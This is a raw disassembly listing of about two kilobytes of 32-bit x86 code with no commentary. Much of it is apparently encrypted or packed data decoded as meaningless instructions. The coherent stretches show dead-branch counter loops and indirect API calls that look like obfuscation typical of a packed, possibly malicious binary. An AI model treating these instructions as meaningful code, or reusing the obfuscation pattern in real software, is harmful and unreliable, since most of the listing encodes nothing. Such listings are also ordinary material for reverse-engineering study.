  409fc7:	cmp    ch,BYTE PTR [ecx+ebx*2+0x24]
  409fcb:	fcom   DWORD PTR [edx]
  409fcd:	ret    0xf8cc
  409fd0:	(bad)  
  409fd3:	outs   dx,BYTE PTR ds:[esi]
  409fd4:	xor    al,0x4a
  409fd6:	das    
  409fd7:	mov    ds:0xc70dea01,al
  409fdc:	push   edx
  409fdd:	xor    DWORD PTR [ecx-0x3a21d998],ecx
  409fe3:	jae    0x40a044
  409fe5:	or     BYTE PTR [ecx+0x79511b74],ch
  409feb:	mov    ebx,0xd84e850f
  409ff0:	inc    esp
  409ff1:	int    0xe2
  409ff3:	sbb    ch,BYTE PTR [ecx-0x622a3aa8]
  409ff9:	pop    edi
  409ffa:	or     eax,0x1ccf41a8
  409fff:	je     0x409ffe
  40a001:	(bad)  
  40a002:	xor    ecx,DWORD PTR [ebp+0x7091b402]
  40a008:	pop    ebx
  40a009:	aaa    
  40a00a:	lods   al,BYTE PTR ds:[esi]
  40a00b:	aaa    
  40a00c:	dec    esi
  40a00d:	mov    eax,ds:0x5d7908fc
  40a012:	adc    esp,DWORD PTR [esi+0x362922aa]
  40a018:	or     DWORD PTR [esi+0x3d],esi
  40a01b:	sbb    DWORD PTR [ebx-0x37abf67c],ebx
  40a021:	jnp    0x40a041
  40a023:	and    BYTE PTR [ebx],cl
  40a025:	aad    0x53
  40a027:	mov    ecx,0x43207384
  40a02c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a02d:	cli    
  40a02e:	xchg   esp,eax
  40a02f:	add    DWORD PTR [ecx-0x34224796],ecx
  40a035:	sub    ch,ah
  40a037:	mov    ebp,0x8bffacbe
  40a03c:	dec    ebp
  40a03d:	or     BYTE PTR [ecx+0x7e901],cl
  40a043:	add    BYTE PTR [eax],al
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0x1460,0xa4
  40a1b4:	cdq    
  40a1b5:	xchg   ecx,eax
  40a1b6:	loop   0x40a1b1
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	xor    al,0xdd
  40a1c0:	xchg   edi,eax
  40a1c1:	pop    edx
  40a1c2:	int3   
  40a1c3:	xchg   esi,eax
  40a1c4:	pop    es
  40a1c5:	(bad)  
  40a1c6:	aas    
  40a1c7:	or     edi,0x66f88253
  40a1cd:	push   eax
  40a1ce:	pop    eax
  40a1cf:	lea    esp,gs:[ecx-0x32]
  40a1d3:	cmp    BYTE PTR [esi+ebx*4-0x5a8cb51c],bh
  40a1da:	(bad)  
  40a1db:	mov    ebx,0x19489bec
  40a1e0:	mov    ah,BYTE PTR [edx-0x1]
  40a1e3:	sub    al,0x70
  40a1e5:	(bad)  
  40a1e6:	jmp    0x40a1d0
  40a1e8:	lods   al,BYTE PTR ds:[esi]
  40a1e9:	outs   dx,BYTE PTR ds:[esi]
  40a1ea:	cmp    eax,0xed3a54ae
  40a1ef:	jae    0x40a17f
  40a1f1:	mov    ebp,0x2207d2c4
  40a1f6:	nop
  40a1f7:	sbb    DWORD PTR [ecx-0x3f],eax
  40a1fa:	xchg   DWORD PTR [ebp-0x2810a593],ebx
  40a200:	cwde   
  40a201:	push   cs
  40a202:	jno    0x40a214
  40a204:	xchg   edi,eax
  40a205:	inc    ecx
  40a206:	jmp    0xbe67:0xac64081e
  40a20d:	xchg   edi,eax
  40a20e:	in     eax,0xaa
  40a210:	mov    cl,BYTE PTR [ebx+edi*1]
  40a213:	sbb    BYTE PTR [edx+0x126aa20b],cl
  40a219:	(bad)  
  40a21a:	sbb    BYTE PTR [edx-0x6ea13a57],al
  40a220:	out    0x2c,eax
  40a222:	ins    DWORD PTR es:[edi],dx
  40a223:	adc    eax,ebx
  40a225:	jnp    0x40a1b2
  40a227:	retf   0x15e0
  40a22a:	out    0x75,al
  40a22c:	push   edi
  40a22d:	push   esp
  40a22e:	mov    ecx,0x36abbd03
  40a233:	loop   0x40a286
  40a235:	pop    ebp
  40a236:	in     al,dx
  40a237:	or     eax,0x3b72332d
  40a23c:	int    0xde
  40a23e:	retf   0xca1e
  40a241:	pop    es
  40a242:	push   0x6
  40a244:	xor    BYTE PTR [ebx-0x62],cl
  40a247:	mov    cs,WORD PTR [esp+ecx*1-0x42]
  40a24b:	mov    esi,0xad87fe4a
  40a250:	enter  0x9ca3,0xcf
  40a254:	or     eax,0x3d0bedde
  40a259:	lock xchg ebp,eax
  40a25b:	data16 (bad) [esi*4+0x49d8d6e9]
  40a263:	addr16 jne 0x40a21f
  40a266:	jecxz  0x40a253
  40a268:	loope  0x40a294
  40a26a:	jmp    0x44eda198
  40a26f:	pop    ss
  40a270:	pop    edx
  40a271:	mov    esp,0x371f9d7f
  40a276:	sbb    cl,ah
  40a278:	dec    edx
  40a279:	sti    
  40a27a:	das    
  40a27b:	xlat   BYTE PTR ds:[ebx]
  40a27c:	stos   DWORD PTR es:[edi],eax
  40a27d:	into   
  40a27e:	ins    BYTE PTR es:[edi],dx
  40a27f:	inc    esi
  40a280:	mov    ds:0x55c210b3,eax
  40a285:	sub    al,0x70
  40a287:	lock addr16 push edx
  40a28a:	in     al,0xf4
  40a28c:	imul   ebx,edi,0x60
  40a28f:	xor    eax,0xd0a3434
  40a294:	aaa    
  40a295:	push   eax
  40a296:	mov    cl,0x9a
  40a298:	popa   
  40a299:	into   
  40a29a:	push   ds
  40a29b:	xor    cl,bh
  40a29d:	cmc    
  40a29e:	dec    esi
  40a29f:	hlt    
  40a2a0:	sub    eax,0xe9dba708
  40a2a5:	mov    eax,DWORD PTR [ebp+0x193cf382]
  40a2ab:	pop    es
  40a2ac:	sbb    al,0x5b
  40a2ae:	pop    eax
  40a2af:	push   ecx
  40a2b0:	icebp  
  40a2b1:	push   es
  40a2b2:	mov    esp,0x76b656fc
  40a2b7:	push   ebp
  40a2b8:	or     DWORD PTR [edi+0x78],eax
  40a2bb:	add    esi,DWORD PTR [eax-0x51653d05]
  40a2c1:	lahf   
  40a2c2:	sub    cl,dl
  40a2c4:	fldenv ds:0x2920a6f4
  40a2ca:	daa    
  40a2cb:	push   0x7d8a11bb
  40a2d0:	adc    edi,DWORD PTR [esi+0x44]
  40a2d3:	cmc    
  40a2d4:	ret    0xfd27
  40a2d7:	dec    ecx
  40a2d8:	imul   eax,esi,0xc099b37e
  40a2de:	push   ss
  40a2df:	inc    ebp
  40a2e0:	jmp    0xb78b:0xc0e37b9f
  40a2e7:	mov    ecx,0x5ed6b174
  40a2ec:	scas   al,BYTE PTR es:[edi]
  40a2ed:	ret    
  40a2ee:	mov    edi,0x4d17fe79
  40a2f3:	sub    al,0xd6
  40a2f5:	outs   dx,DWORD PTR ds:[esi]
  40a2f6:	sub    al,0x3b
  40a2f8:	cmp    bh,0x18
  40a2fb:	ds jb  0x40a31e
  40a2fe:	shl    DWORD PTR [esi+0x68c7c1e1],1
  40a304:	clc    
  40a305:	lods   eax,DWORD PTR ds:[esi]
  40a306:	xor    edi,DWORD PTR [esi+0xa]
  40a309:	fisub  WORD PTR [ecx]
  40a30b:	and    al,dh
  40a30d:	test   eax,0xb818e4de
  40a312:	mov    edi,0xc3e6676c
  40a317:	adc    al,0x12
  40a319:	pop    ss
  40a31a:	or     esi,ebx
  40a31c:	cmp    ecx,ebp
  40a31e:	lea    ebx,[eax]
  40a320:	(bad)  
  40a321:	rcr    DWORD PTR [edi+0x40],1
  40a324:	lods   eax,DWORD PTR ds:[esi]
  40a325:	xor    ebx,DWORD PTR [esi-0x2f6d20a5]
  40a32b:	loope  0x40a36b
  40a32d:	sub    edx,ecx
  40a32f:	mov    al,ds:0x1e18ad6d
  40a334:	lock xchg ebx,eax
  40a336:	sbb    DWORD PTR [edi+0x1b],0x21f17f
  40a33d:	xor    al,0x2e
  40a33f:	mov    edx,0x5eff9e46
  40a344:	jle    0x40a34e
  40a346:	outs   dx,DWORD PTR ds:[esi]
  40a347:	mov    eax,ds:0x234e35e7
  40a34c:	jge    0x40a380
  40a34e:	wrmsr  
  40a350:	add    DWORD PTR [bx],edi
  40a353:	cmc    
  40a354:	inc    esi
  40a355:	ss in  al,dx
  40a357:	cmp    dh,BYTE PTR [esi+edx*1-0x728eb49]
  40a35e:	xor    eax,0x7ca3cf19
  40a363:	mov    dl,0x1b
  40a365:	xor    bl,BYTE PTR [edi-0x1a9e8408]
  40a36b:	ficomp WORD PTR [ecx+0x3f]
  40a36e:	cmc    
  40a36f:	sub    dl,ah
  40a371:	pop    ss
  40a372:	sar    DWORD PTR [eax-0x57378a84],cl
  40a378:	adc    esi,DWORD PTR [ebp+0x3abe44ba]
  40a37e:	iret   
  40a37f:	scas   al,BYTE PTR es:[edi]
  40a380:	adc    DWORD PTR [eax-0x4362e38b],edx
  40a386:	mov    WORD PTR [esp+ecx*4-0x11],fs
  40a38a:	and    dh,dh
  40a38c:	shl    BYTE PTR [edx-0x1e4603fd],0xc9
  40a393:	xchg   ebx,eax
  40a394:	mul    DWORD PTR [ebp-0x42ebffa9]
  40a39a:	push   cs
  40a39b:	mov    esp,0xfee7a322
  40a3a0:	ret    
  40a3a1:	shr    bh,0xd1
  40a3a4:	jae    0x40a3d5
  40a3a6:	les    ecx,FWORD PTR [esi+0x74fe782d]
  40a3ac:	xchg   esi,eax
  40a3ad:	jecxz  0x40a3e2
  40a3af:	pop    edi
  40a3b0:	cld    
  40a3b1:	(bad)  
  40a3b2:	xchg   ecx,eax
  40a3b3:	popa   
  40a3b4:	jl     0x40a341
  40a3b6:	ins    DWORD PTR es:[edi],dx
  40a3b7:	jo     0x40a35b
  40a3b9:	pop    ebp
  40a3ba:	iret   
  40a3bb:	ror    DWORD PTR ss:[esi],0x1c
  40a3bf:	lods   eax,DWORD PTR ds:[esi]
  40a3c0:	push   ebx
  40a3c1:	pop    eax
  40a3c2:	in     eax,0xfa
  40a3c4:	pop    esi
  40a3c5:	xchg   BYTE PTR [ebp*8+0x2953521a],dl
  40a3cc:	cmp    al,BYTE PTR [edx]
  40a3ce:	jmp    0x319836d1
  40a3d3:	call   0x90cdd28
  40a3d8:	cmp    esp,DWORD PTR [esi-0x18a35291]
  40a3de:	adc    eax,0x59444196
  40a3e3:	ret    0xfc89
  40a3e6:	js     0x40a3cd
  40a3e8:	test   eax,0xf6de1f07
  40a3ed:	inc    eax
  40a3ee:	pop    ss
  40a3ef:	add    DWORD PTR [ebx+eax*2+0x4c],ebp
  40a3f3:	mov    dl,0xf9
  40a3f5:	push   eax
  40a3f6:	pop    ds
  40a3f7:	fucom  st(2)
  40a3f9:	aad    0x85
  40a3fb:	mul    BYTE PTR [edi]
  40a3fd:	fmul   QWORD PTR [esi]
  40a3ff:	sbb    al,0x13
  40a402:	add    esi,DWORD PTR [edi]
  40a404:	or     BYTE PTR [edx],al
  40a406:	stc    
  40a407:	cmp    eax,0xaac3f8cd
  40a40c:	dec    ecx
  40a40d:	sti    
  40a40e:	(bad)  
  40a40f:	cmp    BYTE PTR [eax+0x14],dh
  40a412:	or     esp,ebx
  40a414:	dec    ebx
  40a415:	pop    ss
  40a416:	pop    ss
  40a417:	dec    eax
  40a418:	loope  0x40a3ea
  40a41a:	bound  ebx,QWORD PTR [edx]
  40a41c:	jmp    0xb840:0x1bc692c6
  40a423:	jb     0x40a473
  40a425:	push   0xcbaa1acb
  40a42a:	mov    edx,0x75429012
  40a42f:	and    eax,0x6fb9d5b8
  40a434:	inc    ebx
  40a435:	icebp  
  40a436:	cs (bad) 
  40a439:	jo     0x40a3ff
  40a43b:	mov    ebx,0xe0dc9a37
  40a440:	fdiv   QWORD PTR [esi]
  40a442:	xlat   BYTE PTR cs:[ebx]
  40a444:	fsub   st(1),st
  40a446:	mov    edx,0x8d0592fe
  40a44b:	lahf   
  40a44c:	cmp    DWORD PTR [edx+0x42],ebx
  40a44f:	cmc    
  40a450:	xchg   esi,eax
  40a451:	push   DWORD PTR [ebx+0x439c2c52]
  40a457:	push   ecx
  40a458:	mov    WORD PTR [eax+0x5c],ds
  40a45b:	xchg   ecx,eax
  40a45c:	xchg   DWORD PTR cs:[edx+0x7d4e1700],edx
  40a463:	into   
  40a464:	jo     0x40a4b2
  40a466:	test   BYTE PTR [eax],bl
  40a468:	sub    DWORD PTR [ebx-0x73],0x7e
  40a46c:	adc    eax,0x40da14a5
  40a471:	cld    
  40a472:	cmp    al,0xa8
  40a474:	sub    ah,ch
  40a476:	mov    dl,0x8e
  40a478:	sti    
  40a479:	jmp    0xcf1bced7
  40a47e:	mov    ch,BYTE PTR [ecx+0x77]
  40a481:	je     0x40a4a1
  40a483:	inc    ecx
  40a484:	ret    
  40a485:	out    dx,al
  40a486:	cmc    
  40a487:	xchg   edi,eax
  40a488:	fstp   QWORD PTR [ebx+0x55]
  40a48b:	sub    BYTE PTR [ebp+0x69945728],bh
  40a491:	cli    
  40a492:	xor    BYTE PTR [esi],bh
  40a494:	add    cl,dh
  40a496:	hlt    
  40a497:	jl     0x40a422
  40a499:	and    edx,DWORD PTR [edi+0x5f543935]
  40a49f:	push   ecx
  40a4a0:	aas    
  40a4a1:	(bad)  
  40a4a2:	clc    
  40a4a3:	xchg   esp,eax
  40a4a4:	mov    ch,0x45
  40a4a6:	sub    BYTE PTR [edx+0x59],dh
  40a4a9:	loope  0x40a480
  40a4ab:	add    al,0xb5
  40a4ad:	jmp    0x584c48ee
  40a4b2:	push   edi
  40a4b3:	add    eax,0x9e0d8f31
  40a4b8:	jno    0x40a52b
  40a4ba:	lea    eax,[ebp-0x24]
  40a4bd:	and    DWORD PTR ds:0x42a7cd,0x42a7f5
  40a4c7:	mov    DWORD PTR [ebp-0x28],eax
  40a4ca:	sub    DWORD PTR ds:0x42a889,0x30d0
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2-0x2c],dh
  40a61b:	add    BYTE PTR [ebp-0x78],cl
  40a61e:	fdivp  st(6),st
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	or     DWORD PTR [ebp*4-0x387cfe48],eax
  40a62d:	cmp    ecx,DWORD PTR [edi]
  40a62f:	fbstp  TBYTE PTR [eax+0x2e]
  40a632:	test   BYTE PTR [eax-0x24],ah
  40a635:	out    0x16,eax
  40a637:	adc    eax,0xab2afe22
  40a63c:	ret    
  40a63d:	outs   dx,DWORD PTR ds:[esi]
  40a63e:	cs or  al,0xa7
  40a641:	test   eax,0xd0805498
  40a646:	xchg   BYTE PTR [eax-0x525713e6],dl
  40a64c:	inc    edi
  40a64d:	retf   0xd3d6
  40a650:	nop
  40a651:	cld    
  40a652:	mov    esp,0xdd481576
  40a657:	adc    BYTE PTR [esi+0x44c8a64d],0x49
  40a65e:	retf   
  40a65f:	push   eax
  40a660:	hlt    
  40a661:	dec    edi
  40a662:	or     esp,DWORD PTR [esi+0x6b9d9d82]
  40a668:	aas    
  40a669:	inc    eax
  40a66a:	add    al,0x7c
  40a66c:	add    esp,0xca6af802
  40a672:	inc    edx
  40a673:	mov    dh,0xf6
  40a675:	retf   0xa542
  40a678:	sub    DWORD PTR [eax-0x2506c760],0x98671891
  40a682:	mov    ds:0x5d31603c,al
  40a687:	fnstsw WORD PTR [edi+0x71f51c20]
  40a68d:	adc    BYTE PTR [ecx],0x1d
  40a690:	dec    ebp
  40a691:	jp     0x40a683
  40a693:	adc    ebp,ebp
  40a695:	rcl    bh,1
  40a697:	(bad)  
  40a699:	sar    cl,0x44
  40a69c:	out    0x5,al
  40a69e:	inc    edx
  40a69f:	out    dx,eax
  40a6a0:	push   DWORD PTR [ecx-0x6a]
  40a6a3:	cs lock xor ecx,eax
  40a6a7:	ret    0x5c2c
  40a6aa:	cmp    DWORD PTR [edi+0x4eda1055],ebp
  40a6b0:	mov    dl,0xfa
  40a6b2:	in     al,dx
  40a6b3:	jne    0x40a692
  40a6b5:	push   ebp
  40a6b6:	(bad)  
  40a6b7:	and    BYTE PTR [esi],bh
  40a6b9:	addr16 je 0x40a6b7
  40a6bc:	mov    edi,0xc7e395ce
  40a6c1:	scas   eax,DWORD PTR es:[edi]
  40a6c2:	fs int 0xe5
  40a6c5:	mov    edi,0xd79738c6
  40a6ca:	std    
  40a6cb:	adc    eax,0x1da32915
  40a6d0:	cmp    eax,0x1e3c9a7f
  40a6d5:	enter  0xded1,0xb4
  40a6d9:	fisttp QWORD PTR [ebp-0x56]
  40a6dc:	addr16 adc al,0xf1
  40a6df:	test   esp,esi
  40a6e1:	int    0x33
  40a6e3:	inc    ecx
  40a6e4:	fadd   st,st(2)
  40a6e6:	cmp    BYTE PTR [ecx],bh
  40a6e8:	ror    DWORD PTR [ebx+0x54a5100b],0x72
  40a6ef:	sbb    eax,0xb4236e41
  40a6f4:	and    eax,0x88887b0a
  40a6f9:	nop
  40a6fa:	shr    DWORD PTR [eax],0x5c
  40a6fd:	ds push edx
  40a6ff:	xchg   edx,eax
  40a700:	cmp    ebp,DWORD PTR [ebp-0xc]
  40a703:	pop    edx
  40a704:	dec    esi
  40a705:	pop    eax
  40a706:	mov    dl,0xeb
  40a708:	xchg   esi,eax
  40a709:	stc    
  40a70a:	popf   
  40a70b:	xor    BYTE PTR [edx],al
  40a70d:	mov    eax,0xe423f6c
  40a712:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a714:	cli    
  40a715:	sub    ecx,DWORD PTR [esi+0x261661ab]
  40a71b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a71c:	jmp    DWORD PTR [ebx+0x5c]
  40a71f:	arpl   WORD PTR [ecx],sp
  40a721:	jns    0x40a6b9
  40a723:	dec    esp
  40a724:	lds    ecx,FWORD PTR [ecx-0x2e]
  40a727:	add    ebp,DWORD PTR es:[ebx+0x74770d8a]
  40a72e:	sbb    BYTE PTR [eax-0x737cc073],bh
  40a734:	sbb    edx,DWORD PTR [edx-0x27a439c3]
  40a73a:	lahf   
  40a73b:	sub    al,0x51
  40a73d:	fmul   st(1),st
  40a73f:	cmp    dh,ch
  40a741:	xchg   ecx,eax
  40a742:	scas   eax,DWORD PTR es:[edi]
  40a743:	xchg   DWORD PTR [edi+ebx*8+0x62],esi
  40a747:	sbb    al,0xac
  40a749:	(bad)  [edx+ebp*1]
  40a74c:	add    DWORD PTR [ecx],ebx
  40a74e:	jle    0x40a7ac
  40a750:	jmp    0x48377fd
  40a755:	xor    DWORD PTR [edx],esp
  40a757:	push   0xce5e23b2
  40a75c:	jecxz  0x40a78d
  40a75e:	cmp    eax,0xcebaedd9
  40a763:	pop    edx
  40a764:	int    0x8d
  40a766:	aas    
  40a767:	xchg   ebp,eax
  40a768:	cmp    cl,BYTE PTR [ebp+eiz*2+0x54]
  40a76c:	push   0x1b
  40a76e:	cmp    al,0xbd
  40a770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a771:	jnp    0x40a7cc
  40a773:	mov    al,ds:0x197beb18
  40a778:	clc    
  40a779:	pop    ds
  40a77a:	fcomp  QWORD PTR [eax+0x6f]
  40a77d:	mov    bh,cl
  40a77f:	es mov esi,0x941e239a
  40a785:	repz mov edx,0xccef5a19
  40a78b:	and    eax,0x66b7fcf4
  40a790:	adc    ch,BYTE PTR ds:0x9677509c
  40a796:	xchg   ecx,eax
  40a797:	outs   dx,DWORD PTR ds:[esi]
  40a798:	dec    esp
  40a799:	jb     0x40a7d9
  40a79b:	cmp    BYTE PTR [edx+0x1641b9f5],bh
  40a7a1:	sbb    DWORD PTR [eax+0xc],ebp
  40a7a4:	lea    edi,[eax-0x1b271f49]
  40a7aa:	xor    BYTE PTR [edx],al
  40a7ac:	xor    ebx,DWORD PTR [ebx]
  40a7ae:	and    BYTE PTR [edi-0x12c53fe9],ch
  40a7b4:	ja     0x40a7aa
  40a7b6:	xor    DWORD PTR [ebp+eiz*4+0x24339b9a],ecx
  40a7bd:	cmp    ch,BYTE PTR [ecx]
  40a7bf:	repnz in eax,dx
  40a7c1:	xchg   edx,eax
  40a7c2:	sbb    BYTE PTR [eax],cl
  40a7c4:	push   edx
  40a7c5:	cs icebp 
  40a7c7:	mov    esi,0x974182ba
  40a7cc:	cli    
  40a7cd:	out    dx,al
  40a7ce:	mov    al,0x5f
  40a7d0:	push   0xe10f74bd
  40a7d5:	shl    DWORD PTR [ebp-0x3459adbc],cl
  40a7db:	and    dh,ch
  40a7dd:	xchg   edi,eax
  40a7de:	jns    0x40a7b6
  40a7e0:	adc    eax,0x657b5bb7
  40a7e5:	(bad)  
  40a7e6:	fsub   st(3),st
  40a7e8:	out    dx,eax
  40a7e9:	cdq    
  40a7ea:	mov    al,ds:0x7c6f89d7
  40a7ef:	leave  
  40a7f0:	je     0x40a7eb
  40a7f2:	lahf   
  40a7f3:	call   0x7c20:0xbf6b8955
  40a7fa:	jmp    DWORD PTR [eax-0x78be3072]
  40a800:	xor    edx,edi
  40a802:	mov    ah,0x34
  40a804:	add    DWORD PTR [ebx],0xfffffff2
  40a807:	push   ds
  40a808:	das    
  40a809:	sub    al,0x5a
  40a80b:	js     0x40a7e6
  40a80d:	jp     0x40a851
  40a80f:	cwde   
  40a810:	push   0xe88f006e
  40a815:	push   ss
  40a816:	outs   dx,DWORD PTR ds:[esi]
  40a817:	jnp    0x40a7c4
  40a819:	mov    edx,cs
  40a81b:	inc    ecx
  40a81c:	dec    ebp
  40a81d:	aas    
  40a81e:	xchg   ebp,eax
  40a81f:	fsub   DWORD PTR [edi-0x6a6c0ecc]
  40a825:	mov    al,ds:0xd7392178
  40a82a:	mov    ah,0xb8
  40a82c:	pop    ecx
  40a82d:	inc    esi
  40a82e:	adc    BYTE PTR [ebx-0x80],cl
  40a831:	pop    ecx
  40a832:	xor    BYTE PTR [edi],bh
  40a834:	outs   dx,DWORD PTR ds:[esi]
  40a835:	scas   eax,DWORD PTR es:[edi]
  40a836:	cld    
  40a837:	adc    BYTE PTR [eiz*1+0x28538d40],cl
  40a83e:	test   eax,0x2beac5d1
  40a843:	pop    es
  40a844:	pop    ss
  40a845:	ror    eax,cl
  40a847:	mov    ecx,0x8c551744
  40a84c:	mov    al,ds:0x4cefcb47
  40a851:	rcl    eax,cl
  40a853:	pop    ecx
  40a854:	outs   dx,BYTE PTR ds:[esi]
  40a855:	adc    al,0xf8
  40a857:	push   ebx
  40a858:	add    al,BYTE PTR [ebp-0x74bd56b5]
  40a85e:	push   ss
  40a85f:	data16 std 
  40a861:	gs jecxz 0x40a861
  40a864:	jnp    0x40a8d7
  40a866:	stos   DWORD PTR es:[edi],eax
  40a867:	xor    dh,BYTE PTR [ebp+0xdbcfe41]
  40a86d:	or     dh,BYTE PTR [edx]
  40a86f:	lods   eax,DWORD PTR ds:[esi]
  40a870:	sub    al,0xba
  40a872:	cmp    bl,ah
  40a874:	imul   ecx,DWORD PTR [edx],0x34
  40a877:	push   ebx
  40a878:	jae    0x40a841
  40a87a:	call   0x9a43:0x63cfd41c
  40a881:	xor    al,BYTE PTR [ebx]
  40a883:	es jnp 0x40a89d
  40a886:	add    ch,BYTE PTR [ecx]
  40a888:	xchg   ebx,eax
  40a889:	das    
  40a88a:	cmp    al,0x35
  40a88c:	ficomp WORD PTR [ebx]
  40a88e:	sbb    edi,esi
  40a890:	dec    esi
  40a891:	loopne 0x40a84e
  40a893:	sub    dl,BYTE PTR [edi+0x78bb67a9]
  40a899:	and    al,0x70
  40a89b:	lds    esp,FWORD PTR [ecx+0x5505ac36]
  40a8a1:	cmc    
